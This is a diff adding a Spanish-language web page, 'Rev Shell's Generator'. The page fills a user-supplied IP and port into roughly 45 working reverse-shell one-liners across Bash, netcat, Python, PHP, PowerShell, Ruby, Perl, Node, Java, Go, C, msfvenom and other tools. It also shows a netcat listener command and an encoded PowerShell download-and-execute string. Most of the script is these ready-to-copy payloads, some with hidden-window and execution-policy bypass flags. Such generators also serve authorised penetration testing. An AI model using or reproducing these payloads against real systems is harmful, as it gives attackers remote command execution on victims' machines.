@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rev Shell's Generator</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/night-owl.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <style>
+        @font-face {
+            font-family: 'Hack Nerd Font';
+            src: url('HackNerdFont-Regular.ttf') format('truetype');
+        }
+
+        * {
+            font-family: 'Hack Nerd Font', monospace;
+        }
+
+        body {
+            margin: 0;
+            background-color: #121212;
+            background-image: linear-gradient(90deg, rgba(255, 255, 255, 0.02) 1px, transparent 1px),
+                linear-gradient(rgba(255, 255, 255, 0.02) 1px, transparent 1px);
+            background-size: 20px 20px;
+            color: #ccc;
+        }
+
+        .container {
+            max-width: 1100px;
+            margin: auto;
+            padding: 20px;
+        }
+
+        h1 {
+            text-align: center;
+            margin-top: 30px;
+        }
+
+        .description {
+            text-align: center;
+            color: #aaa;
+        }
+
+        .input-group {
+            text-align: center;
+            margin: 30px 0;
+        }
+
+        input,
+        select {
+            padding: 10px;
+            margin: 5px;
+            width: 200px;
+            border-radius: 8px;
+            border: 1px solid #555;
+            background: #1f1f1f;
+            color: white;
+        }
+
+        button {
+            padding: 10px 15px;
+            border-radius: 8px;
+            border: none;
+            background: #333;
+            color: white;
+            cursor: pointer;
+        }
+
+        /* TERMINAL */
+        .terminal {
+            margin-top: 20px;
+            border-radius: 10px;
+            background: #0d0d0d;
+            border: 1px solid #333;
+            overflow: hidden;
+        }
+
+        .terminal-header {
+            background: #1a1a1a;
+            padding: 6px 10px;
+            display: flex;
+            gap: 6px;
+        }
+
+        .dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+        }
+
+        .red {
+            background: #ff5f56;
+        }
+
+        .yellow {
+            background: #ffbd2e;
+        }
+
+        .green {
+            background: #27c93f;
+        }
+
+        .terminal-body {
+            padding: 15px;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-break: break-word;
+            color: #eee;
+        }
+
+        .label {
+            color: #888;
+            font-size: 0.8rem;
+        }
+
+        .ip {
+            color: #00ff88;
+        }
+
+        .port {
+            color: #66aaff;
+        }
+
+        .copy-icon {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            cursor: pointer;
+        }
+
+        .result-wrapper {
+            position: relative;
+        }
+
+        /* TOAST */
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(60, 60, 60, 0.8);
+            padding: 10px 15px;
+            border-radius: 10px;
+            opacity: 0;
+            transition: 0.3s;
+        }
+
+        .toast.show {
+            opacity: 1;
+        }
+
+        /* Mejoras para syntax highlighting */
+
+        .hljs {
+            background: transparent !important;
+            padding: 0 !important;
+        }
+
+        /* Evitar barra horizontal y forzar salto de línea */
+        pre {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            word-break: break-all;
+            overflow-x: hidden;
+        }
+
+        code {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            word-break: break-all;
+        }
+
+        .terminal-body {
+            padding: 15px;
+            overflow-x: hidden;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-break: break-word;
+        }
+
+        /* Mejora la sintaxis de colores para mejor diferenciación */
+        .hljs-keyword,
+        .hljs-selector-tag,
+        .hljs-built_in {
+            color: #c678dd !important;
+            /* Morado para palabras clave */
+            font-weight: bold;
+        }
+
+        .hljs-string,
+        .hljs-attribute {
+            color: #98c379 !important;
+            /* Verde para strings */
+        }
+
+        .hljs-number {
+            color: #d19a66 !important;
+            /* Naranja para números */
+        }
+
+        .hljs-function,
+        .hljs-title,
+        .hljs-section {
+            color: #61afef !important;
+            /* Azul para funciones */
+        }
+
+        .hljs-comment {
+            color: #5c6370 !important;
+            /* Gris para comentarios */
+            font-style: italic;
+        }
+
+        .hljs-variable {
+            color: #e06c75 !important;
+            /* Rojo para variables */
+        }
+
+        .hljs-literal {
+            color: #56b6c2 !important;
+            /* Cyan para literales */
+        }
+
+        .hljs-operator {
+            color: #abb2bf !important;
+            /* Gris claro para operadores */
+        }
+
+        /* Comandos de sistema/binarios en negrita */
+        .hljs-built_in,
+        .hljs-keyword {
+            font-weight: bold;
+        }
+
+        /* Mejorar contraste general */
+        .hljs {
+            background: transparent !important;
+            color: #abb2bf !important;
+            line-height: 1.5;
+        }
+
+        /* Resaltado especial para comandos shell */
+        .language-bash .hljs-built_in {
+            color: #e5c07b !important;
+            /* Amarillo para comandos como nc, bash, etc */
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+        <h1>Rev Shell's Generator</h1>
+        <p class="description">
+            Crea comandos de reverse shell en distintos lenguajes (Bash, Python, PHP, PowerShell, Netcat, etc.)<br>
+            usando tu propia IP y puerto automáticamente
+        </p>
+
+        <div class="input-group">
+            <input type="text" id="ip" placeholder="Tu IP">
+            <input type="text" id="port" placeholder="Puerto">
+            <br><br>
+
+            <select id="type" size="1">
+                <optgroup label="Linux/Unix Shells">
+                    <option value="bash">Bash (TCP)</option>
+                    <option value="bash_udp">Bash (UDP)</option>
+                    <option value="bash_exec">Bash (Exec)</option>
+                    <option value="bash_echo">Bash (Echo)</option>
+                    <option value="sh">Sh</option>
+                    <option value="sh_udp">Sh (UDP)</option>
+                    <option value="netcat">Netcat</option>
+                    <option value="netcat_nc">Netcat (nc)</option>
+                    <option value="netcat_ncat">Netcat (ncat --ssl)</option>
+                    <option value="netcat_udp">Netcat (UDP)</option>
+                    <option value="netcat_mkfifo">Netcat + mkfifo</option>
+                    <option value="socat">Socat</option>
+                    <option value="socat_udp">Socat (UDP)</option>
+                    <option value="telnet">Telnet</option>
+                    <option value="telnet_fifo">Telnet + fifo</option>
+                    <option value="openssl">OpenSSL</option>
+                </optgroup>
+                <optgroup label="Scripting Languages">
+                    <option value="python">Python3</option>
+                    <option value="python2">Python2</option>
+                    <option value="python_pty">Python + PTY</option>
+                    <option value="python_win_ps">Python + PowerShell</option>
+                    <option value="php">PHP</option>
+                    <option value="php_system">PHP (system)</option>
+                    <option value="php_popen">PHP (popen)</option>
+                    <option value="php_backticks">PHP (backticks)</option>
+                    <option value="ruby">Ruby</option>
+                    <option value="ruby_sh">Ruby (sh)</option>
+                    <option value="ruby_pty">Ruby (PTY)</option>
+                    <option value="perl">Perl</option>
+                    <option value="perl_sh">Perl (sh)</option>
+                    <option value="node">Node.js</option>
+                    <option value="lua">Lua</option>
+                    <option value="awk">AWK</option>
+                    <option value="tcl">TCL</option>
+                </optgroup>
+                <optgroup label="Windows">
+                    <option value="powershell">PowerShell</option>
+                    <option value="powershell_full">PowerShell (Full)</option>
+                    <option value="powershell_base64">PowerShell (Base64)</option>
+                    <option value="python_win">Python (Windows)</option>
+                    <option value="php_windows">PHP (Windows)</option>
+                    <option value="node_win">Node.js (Windows)</option>
+                    <option value="netcat_windows">Netcat (Windows)</option>
+                </optgroup>
+                <optgroup label="Compiled / Other">
+                    <option value="java">Java</option>
+                    <option value="go">Go</option>
+                    <option value="c_compiled">C (GCC)</option>
+                    <option value="groovy">Groovy</option>
+                    <option value="msfvenom_linux_x64">MSFVenom Linux</option>
+                    <option value="msfvenom_windows">MSFVenom Windows</option>
+                </optgroup>
+            </select>
+
+            <button onclick="generate()">Generar</button>
+            <button onclick="generateAll()">Generar Todos</button>
+        </div>
+
+        <div id="output"></div>
+    </div>
+
+    <div id="toast" class="toast"></div>
+
+    <script>
+
+        const ipInput = document.getElementById("ip");
+        const portInput = document.getElementById("port");
+        const typeSelect = document.getElementById("type");
+
+        /* LIMPIAR INPUTS */
+        window.addEventListener("load", () => {
+            ipInput.value = "";
+            portInput.value = "";
+        });
+
+        /* ESCAPE HTML (MUY IMPORTANTE) */
+        function escapeHTML(str) {
+            return str
+                .replaceAll("&", "&amp;")
+                .replaceAll("<", "&lt;")
+                .replaceAll(">", "&gt;");
+        }
+
+        /* RESALTAR */
+        function highlight(text, ip, port) {
+            // Escapamos primero y luego aplicamos los spans
+            let result = text;
+            // Usamos regex para evitar reemplazar dentro de etiquetas HTML
+            const ipRegex = new RegExp(`(${ip.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')})`, 'g');
+            const portRegex = new RegExp(`(${port})`, 'g');
+            result = result.replace(ipRegex, `<span class="ip">$1</span>`);
+            result = result.replace(portRegex, `<span class="port">$1</span>`);
+            return result;
+        }
+
+        /* PAYLOADS */
+        function getPayloads(ip, port) {
+            return {
+                // === BASH / SH ===
+                bash: `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
+                bash_udp: `bash -i >& /dev/udp/${ip}/${port} 0>&1`,
+                bash_exec: `exec 5<>/dev/tcp/${ip}/${port}; cat <&5 | while read line; do $line 2>&5 >&5; done`,
+                bash_echo: `(exec 3<>/dev/tcp/${ip}/${port} && while read line 0<&3; do eval "$line" 2>&3 >&3; done)`,
+                sh: `sh -i >& /dev/tcp/${ip}/${port} 0>&1`,
+                sh_udp: `sh -i >& /dev/udp/${ip}/${port} 0>&1`,
+
+                // === NETCAT / NC ===
+                netcat: `nc -e /bin/sh ${ip} ${port}`,
+                netcat_nc: `nc -e /bin/bash ${ip} ${port}`,
+                netcat_ncat: `ncat --ssl ${ip} ${port} -e /bin/bash`,
+                netcat_udp: `nc -u ${ip} ${port} -e /bin/sh`,
+                netcat_windows: `nc.exe ${ip} ${port} -e cmd.exe`,
+                netcat_mkfifo: `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ${ip} ${port} > /tmp/f`,
+
+                // === PYTHON ===
+                python: `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'`,
+                python_pty: `python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash");'`,
+                python2: `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'`,
+                python_win: `python -c "import socket,subprocess,os;s=socket.socket();s.connect(('${ip}',${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['cmd.exe'])";`,
+                python_win_ps: `python -c "import socket,subprocess,os;s=socket.socket();s.connect(('${ip}',${port}));os.system('powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"\$client = New-Object System.Net.Sockets.TCPClient(\\\"${ip}\\\",${port});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()}; \$client.Close()\"")"`,
+
+                // === PHP ===
+                php: `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
+                php_system: `php -r '$sock=fsockopen("${ip}",${port});system("/bin/sh -i <&3 >&3 2>&3");'`,
+                php_popen: `php -r '$sock=fsockopen("${ip}",${port});$p=popen("/bin/sh -i","r");while(!feof($p)){fwrite($sock,fread($p,1024));}pclose($p);'`,
+                php_backticks: `php -r '$sock=fsockopen("${ip}",${port});shell_exec("/bin/sh -i <&3 >&3 2>&3");'`,
+                php_windows: `php -r '$sock=fsockopen("${ip}",${port});exec("cmd.exe /c dir <&3 >&3 2>&3");'`,
+
+                // === POWERSHELL ===
+                powershell: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});`,
+                powershell_full: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
+                powershell_base64: `powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAyADoAOAAwADAAOAAnACkA`,
+
+                // === RUBY ===
+                ruby: `ruby -rsocket -e 'c=TCPSocket.new("${ip}",${port});while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,
+                ruby_sh: `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${ip}",${port});while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,
+                ruby_pty: `ruby -rsocket -rpty -e 'PTY.spawn("/bin/sh"){|r,w,pid|TCPSocket.new("${ip}",${port}){|s|w.print s.gets;r.each{|l|w.print l}}rescue nil}'`,
+
+                // === PERL ===
+                perl: `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
+                perl_sh: `perl -MIO -e '$p=fork;exit,if($p);$c=IO::Socket::INET->new(PeerAddr=>"${ip}:${port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`,
+
+                // === NODE.JS ===
+                node: `node -e 'require("net").createConnection(${port},"${ip}").on("connect",function(){this.write("node reverse shell\\n");var sh=require("child_process").spawn("/bin/sh",[]);this.pipe(sh.stdin);sh.stdout.pipe(this);sh.stderr.pipe(this);});'`,
+                node_win: `node -e 'require("net").createConnection(${port},"${ip}").on("connect",function(){var sh=require("child_process").spawn("cmd.exe",[]);this.pipe(sh.stdin);sh.stdout.pipe(this);sh.stderr.pipe(this);});'`,
+
+                // === JAVA ===
+                java: `public class RevShell {public static void main(String[] args) throws Exception {Runtime r = Runtime.getRuntime();Process p = r.exec("/bin/sh");java.net.Socket s = new java.net.Socket("${ip}", ${port});new java.lang.Thread(() -> {try {java.io.InputStream is = p.getInputStream();int i;while ((i = is.read()) != -1) s.getOutputStream().write(i);} catch (Exception e) {}}).start();new java.lang.Thread(() -> {try {java.io.InputStream is = s.getInputStream();int i;while ((i = is.read()) != -1) p.getOutputStream().write(i);} catch (Exception e) {}}).start();}}`,
+
+                // === GO ===
+                go: `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${ip}:${port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/shell.go && go run /tmp/shell.go`,
+
+                // === TELNET ===
+                telnet: `telnet ${ip} ${port} | /bin/sh | telnet ${ip} ${port}`,
+                telnet_fifo: `rm -f /tmp/pipe; mkfifo /tmp/pipe; telnet ${ip} ${port} 0</tmp/pipe | /bin/sh 1>/tmp/pipe`,
+
+                // === SOCAT ===
+                socat: `socat exec:'/bin/sh',pty,stderr,setsid,sigint,sane tcp:${ip}:${port}`,
+                socat_udp: `socat exec:'/bin/sh',pty,stderr,setsid,sigint,sane udp:${ip}:${port}`,
+
+                // === OPENSSL ===
+                openssl: `mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ${ip}:${port} > /tmp/s; rm /tmp/s`,
+
+                // === AWK ===
+                awk: `awk 'BEGIN {s="/inet/tcp/0/${ip}/${port}"; while(1){do{s printf "shell>"|& s; s|& getline c; if(c){while(c|& getline)print|& s; close(c)}} while(c!="exit")close(s)}}' /dev/null`,
+
+                // === C (compiled oneliner) ===
+                c_compiled: `printf '#include <stdio.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <unistd.h>\nint main(){int s=socket(AF_INET,SOCK_STREAM,0);struct sockaddr_in a={AF_INET,htons(${port}),inet_addr("${ip}")};connect(s,&a,sizeof a);dup2(s,0);dup2(s,1);dup2(s,2);execl("/bin/sh","sh",0);}' > /tmp/shell.c && gcc /tmp/shell.c -o /tmp/shell && /tmp/shell`,
+
+                // === LUA ===
+                lua: `lua -e "require('socket');c=socket.tcp();c:connect('${ip}',${port});while true do r=c:receive();if r~='then' then f=io.popen(r);l=f:read('*a');c:send(l);end;end"`,
+
+                // === GROOVY ===
+                groovy: `groovy -e "def s=new Socket('${ip}',${port});System.in=System.out=s.getInputStream();Thread.start{while(true){System.out.print(System.in.read())}};def p='cmd.exe'.execute();p.consumeProcessOutput(s.getOutputStream(),s.getOutputStream());p.waitFor()"`,
+
+                // === TCL ===
+                tcl: `echo 'set s [socket ${ip} ${port}];while {[gets $s line]!=-1} {if {[catch {set r [exec $line]} err]} {set r $err};puts $s $r};close $s' | tclsh`,
+
+                // === MSFVENOM (staged) ===
+                msfvenom_linux_x64: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${ip} LPORT=${port} -f elf -o /tmp/shell.elf && chmod +x /tmp/shell.elf && /tmp/shell.elf`,
+                msfvenom_windows: `msfvenom -p windows/shell_reverse_tcp LHOST=${ip} LPORT=${port} -f exe -o /tmp/shell.exe && wine /tmp/shell.exe`,
+            };
+        }
+
+        /* REGISTRAR LENGUAJE BASH MEJORADO */
+        function registerCustomBash() {
+            hljs.registerLanguage('bash', function (hljs) {
+                return {
+                    name: 'Bash',
+                    aliases: ['sh', 'shell'],
+                    keywords: {
+                        keyword: 'if then else elif fi case esac for while until do done function',
+                        built_in: 'alias bg bind break builtin caller cd command compgen complete compopt continue declare dirs disown echo enable eval exec exit export false fc fg getopts hash help history jobs kill let local logout mapfile popd printf pushd pwd read readarray readonly return set shift shopt source suspend test times trap true type typeset ulimit umask unalias unset wait bash sh nc ncat socat telnet openssl awk python python3 python2 php ruby perl node java go groovy lua tcl msfvenom gcc make',
+                        literal: 'true false'
+                    },
+                    contains: [
+                        hljs.SHEBANG({ binary: "bash", relevance: 10 }),
+                        hljs.HASH_COMMENT_MODE,
+                        hljs.QUOTE_STRING_MODE,
+                        {
+                            className: 'string',
+                            begin: /'/,
+                            end: /'/,
+                            contains: [{ begin: /\\./ }],
+                            relevance: 0
+                        },
+                        {
+                            className: 'string',
+                            begin: /"/,
+                            end: /"/,
+                            contains: [
+                                hljs.BACKSLASH_ESCAPE,
+                                { className: 'variable', begin: /\$\{/, end: /\}/ },
+                                { className: 'variable', begin: /\$[a-zA-Z_][a-zA-Z0-9_]*/ }
+                            ],
+                            relevance: 0
+                        },
+                        {
+                            className: 'variable',
+                            begin: /\$[a-zA-Z_][a-zA-Z0-9_]*/
+                        },
+                        {
+                            className: 'number',
+                            begin: /\b\d+\b/
+                        },
+                        {
+                            className: 'operator',
+                            begin: /[<>|&;!(){}[\]]/
+                        }
+                    ]
+                };
+            });
+        }
+
+        // Llamar a la función para registrar el lenguaje
+        registerCustomBash();
+
+        /* GENERAR UNO */
+        function generate() {
+            const ip = ipInput.value;
+            const port = portInput.value;
+            const type = typeSelect.value;
+
+            if (!ip || !port) return showToast("Introduce IP y puerto");
+
+            const payload = getPayloads(ip, port)[type];
+            render([{ name: type, payload }], ip, port, false);
+        }
+
+        /* GENERAR TODOS */
+        function generateAll() {
+            const ip = ipInput.value;
+            const port = portInput.value;
+
+            if (!ip || !port) return showToast("Introduce IP y puerto");
+
+            const data = Object.entries(getPayloads(ip, port))
+                .map(([name, payload]) => ({ name, payload }));
+
+            render(data, ip, port, true);
+        }
+
+        /* RENDER */
+        function render(list, ip, port, showListener = true) {
+            const output = document.getElementById("output");
+            output.innerHTML = "";
+
+            // Mapeo de lenguajes para syntax highlighting
+            const getLang = (name) => {
+                const langs = {
+                    'bash': 'bash', 'bash_udp': 'bash', 'bash_exec': 'bash', 'bash_echo': 'bash', 'sh': 'bash', 'sh_udp': 'bash',
+                    'netcat': 'bash', 'netcat_nc': 'bash', 'netcat_ncat': 'bash', 'netcat_udp': 'bash', 'netcat_windows': 'bash', 'netcat_mkfifo': 'bash',
+                    'socat': 'bash', 'socat_udp': 'bash', 'telnet': 'bash', 'telnet_fifo': 'bash', 'openssl': 'bash',
+                    'python': 'python', 'python2': 'python', 'python_pty': 'python', 'python_win': 'python', 'python_win_ps': 'python',
+                    'php': 'php', 'php_system': 'php', 'php_popen': 'php', 'php_backticks': 'php', 'php_windows': 'php',
+                    'ruby': 'ruby', 'ruby_sh': 'ruby', 'ruby_pty': 'ruby',
+                    'perl': 'perl', 'perl_sh': 'perl',
+                    'node': 'javascript', 'node_win': 'javascript',
+                    'java': 'java', 'go': 'go', 'c_compiled': 'c', 'groovy': 'groovy', 'lua': 'lua', 'awk': 'bash', 'tcl': 'tcl',
+                    'powershell': 'powershell', 'powershell_full': 'powershell', 'powershell_base64': 'powershell',
+                    'msfvenom_linux_x64': 'bash', 'msfvenom_windows': 'bash'
+                };
+                return langs[name] || 'bash';
+            };
+
+            list.forEach(item => {
+                const safePayload = escapeHTML(item.payload);
+                const lang = getLang(item.name);
+                const highlightedPayload = highlight(safePayload, ip, port);
+
+                output.innerHTML += `
+        <div class="result-wrapper">
+            <div class="terminal">
+                <div class="terminal-header">
+                    <div class="dot red"></div>
+                    <div class="dot yellow"></div>
+                    <div class="dot green"></div>
+                </div>
+                <div class="terminal-body">
+<span class="label">${item.name.toUpperCase()}</span>
+
+<pre><code class="language-${lang}">${highlightedPayload}</code></pre>
+                </div>
+            </div>
+            <i class="fas fa-copy copy-icon" data-payload="${encodeURIComponent(item.payload)}"></i>
+        </div>
+        `;
+            });
+
+            if (showListener) {
+                output.innerHTML += `
+        <div class="terminal" style="margin-top:20px;">
+            <div class="terminal-header">
+                <div class="dot red"></div>
+                <div class="dot yellow"></div>
+                <div class="dot green"></div>
+            </div>
+            <div class="terminal-body">
+<span class="label">LISTENER</span>
+
+<pre><code class="language-bash">nc -lvnp <span class="port">${port}</span></code></pre>
+            </div>
+        </div>
+        `;
+            }
+
+            // Aplicar syntax highlighting
+            document.querySelectorAll('pre code').forEach((block) => {
+                hljs.highlightElement(block);
+            });
+        }
+
+        /* COPY */
+        function copy(text) {
+            navigator.clipboard.writeText(text);
+            showToast("Copiado");
+        }
+
+        /* EVENTO GLOBAL COPY */
+        document.addEventListener("click", (e) => {
+            if (e.target.classList.contains("copy-icon")) {
+                const payload = decodeURIComponent(e.target.dataset.payload);
+                copy(payload);
+            }
+        });
+
+        /* TOAST */
+        function showToast(msg) {
+            const t = document.getElementById("toast");
+            t.innerText = msg;
+            t.classList.add("show");
+            setTimeout(() => t.classList.remove("show"), 2000);
+        }
+
+    </script>
+
+</body>
+
+</html>
